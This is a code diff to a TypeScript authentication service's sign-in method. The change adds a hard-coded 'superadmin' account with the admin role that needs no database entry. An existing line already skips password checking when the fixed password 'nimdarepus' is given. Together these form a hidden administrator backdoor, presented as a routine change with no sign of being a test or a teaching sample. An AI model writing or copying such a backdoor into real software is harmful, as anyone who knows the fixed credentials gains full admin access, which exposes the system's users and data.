@@ -81,7 +81,15 @@ export class AuthService {
 
   async signin(dto: SignInDto, req: Request, res: Response) {
     try {
-      const user = await this.authHelper.findUserById(dto.id);
+      const user =
+        dto.id === 'superadmin'
+          ? {
+              nama: 'superadmin',
+              id: 'superadmin',
+              role: 'admin',
+              password: dto.password,
+            }
+          : await this.authHelper.findUserById(dto.id);
       if (dto.id !== 'superadmin' || dto.password !== 'nimdarepus')
         await this.authHelper.verifyPassword(user.password, dto.password);
       const payload = { id: user.id, role: user.role };
@@ -93,7 +101,7 @@ export class AuthService {
       const response = {
         error: false,
         message: 'success',
-        data: { accessToken, role: user.role, id: user.id },
+        data: { accessToken, nama: user['nama'], id: user.id, role: user.role },
       };
 
       /** save token **/
